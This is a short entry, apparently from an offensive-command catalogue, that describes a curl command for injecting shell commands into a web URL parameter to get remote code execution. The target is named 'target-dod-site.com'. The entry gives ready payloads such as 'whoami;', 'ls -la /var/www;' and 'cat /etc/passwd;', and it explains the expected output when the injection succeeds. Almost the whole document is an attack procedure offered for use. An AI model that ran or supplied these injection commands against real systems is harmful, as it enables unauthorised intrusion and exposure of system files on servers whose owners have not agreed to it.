---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
data: >-
  curl "https://target-dod-site.com/vulnerable-endpoint?param=INJECTED_COMMAND"
  -v
tags:
  - rce
  - injection
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:23:37.506Z'
verified: false
validated: true
submitted: true
---
# curl-inject-rce

## Command

```bash
curl "https://target-dod-site.com/vulnerable-endpoint?param=INJECTED_COMMAND" -v
```

## Description

This command uses curl to send a specially crafted HTTP GET request to a vulnerable web endpoint, injecting a shell command into a URL parameter to trigger remote code execution on the server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | The target endpoint with injected payload in the query parameter | Yes |
| -v | Verbose mode to display request/response details | No |
| INJECTED_COMMAND | The shell command to execute, e.g., 'whoami;' or 'cat /etc/passwd;' | Yes |

## Examples

### Basic Usage

```bash
curl "https://target-dod-site.com/search?q=whoami;" -v
```

### Advanced Usage

```bash
curl "https://target-dod-site.com/search?q=ls -la /var/www;" -v
```

## Expected Output

Successful execution returns an HTTP response containing the output of the injected command, such as username from 'whoami' or file listings, embedded in the response body. Errors may indicate failed injection or server-side blocking.

## Related

- [[Related Procedure|procedures/Exploit-RCE-via-URL-Code-Injection]]
